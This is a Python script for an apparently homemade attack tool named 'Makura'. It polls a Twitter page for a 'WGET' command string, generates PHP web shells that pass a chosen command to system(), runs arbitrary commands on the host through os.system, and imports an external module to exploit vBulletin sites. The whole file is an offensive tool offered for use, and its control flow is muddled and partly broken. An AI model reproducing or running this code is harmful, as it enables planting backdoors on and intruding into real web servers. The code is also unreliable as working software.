#!/usr/bin/python
# -*- coding: utf8 -*-

import socket
import time
import sys
import os
import platform
import requests
import urllib.request
import re


def grep():
           
                html_content = urllib.request.urlopen('http://www.twitter.com/ret2pomegranate').read()

                matches = re.findall(b'WGET', html_content);

                if len(matches) == 0:
                        print("\x1b[1;31m[ERR]: Where is your command?\n")
                else:
                        print("\x1b[1;32m[INFO]:  Captured\n")
                        print("\x1b[1;32m[INFO]:  Recieved your command...")

grep()

# If on Windows (Uncomment):
# os.system('clear') 

os.system('clear')

print("\x1b[1;36m")
print("""
.        :    :::.      :::  .   ...    ::::::::::..    :::.     
;;,.    ;;;   ;;`;;     ;;; .;;,.;;     ;;;;;;;``;;;;   ;;`;;    
[[[[, ,[[[[, ,[[ '[[,   [[[[[/' [['     [[[ [[[,/[[['  ,[[ '[[,  
$$$$$$$$"$$$c$$$cc$$$c _$$$$,   $$      $$$ $$$$$$c   c$$$cc$$$c 
888 Y88" 888o888   888,"888"88o,88    .d888 888b "88bo,888   888,
MMM  M'  "MMMYMM   ""`  MMM "MMP""YmmMMMM"" MMMM   "W" YMM   ""` 

 """)
print("\x1b[1;94m Welcome to Makura, Please specify a command.")

print("\n")


capture = input("\x1b[1;37m$makura ").split()

while True:

       if 'wget' in capture:
               grep()
               print("Sleeping...")
               time.sleep(1)


       if 'shell_exec' in capture:
                print("""\x1b[1;37mType in the command & I will generate it into a PHP shell""")
                sh3ll = input("\x1b[1;37m$makura ")
                print("You have entered the command:", sh3ll)
                print("Generating PHP shell")
                time.sleep(1)
                print("\x1b[1;32m<?php")
                time.sleep(0.5)
                print("\x1b[1;32m$output = array();")
                time.sleep(0.5)
                print("\x1b[1;32m$command = \"{}\";".format(sh3ll))
                time.sleep(0.5)
                print("\x1b[1;32mecho 'running the command: <b>'.{}.\"</b><br />\";".format(sh3ll))
                time.sleep(0.5)
                print("\x1b[1;32msystem(\"{}\", $output);".format(sh3ll))
                time.sleep(0.5)
                print("\x1b[1;32mecho implode(\"<br />\n\", $output);")
                time.sleep(0.5)
                print("\x1b[1;32m?>")
                time.sleep(0.2)
                print("PHP Shell has been created.")
                capture = input("\x1b[1;37m$makura ")
            
    
       if 'exit' in capture:
               print("Goodbye...")
               exit()
               

       if 'host' in capture:
           print("\x1b[1;37mWhat command would you want to run in the HOST machine?")
           hostcommand = input("\x1b[1;37m$makura ")
           os.system(hostcommand)

       if 'vbulletin' in capture:
         print("\x1b[1;37mInsert the URL & reciever will exploit it")
         import exploit
       else:
         capture = input("\x1b[1;37m$makura ")

       if 'hello' in capture:
         print("\x1b[1;37mHello, send over a command :)")

       else:
        print("\x1b[1;31m[ERR]: ???\n")


       
